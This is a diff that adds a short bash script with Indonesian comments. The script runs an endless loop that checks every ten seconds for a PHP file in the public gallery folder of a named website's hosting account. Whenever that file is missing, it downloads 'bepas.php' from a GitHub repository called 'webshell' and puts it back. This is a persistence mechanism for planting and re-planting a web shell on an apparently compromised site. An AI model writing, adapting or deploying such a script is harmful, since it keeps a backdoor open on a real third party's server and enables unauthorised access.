@@ -1,0 +1,14 @@
+#!/bin/bash
+
+FILE="/home/u463694275/domains/jigsawfilms.co.uk/public_html/img/gallery/bepas.php"
+URL="https://raw.githubusercontent.com/tuengers1010/webshell/refs/heads/main/bepas.php"
+
+# Loop terus
+while true; do
+    if [ -f "$FILE" ]; then
+        echo "$(date): File sudah ada, lanjut cek nanti..." 2> /dev/null
+    else
+        curl -s -o "$FILE" "$URL" 2> /dev/null
+    fi
+    sleep 10
+done
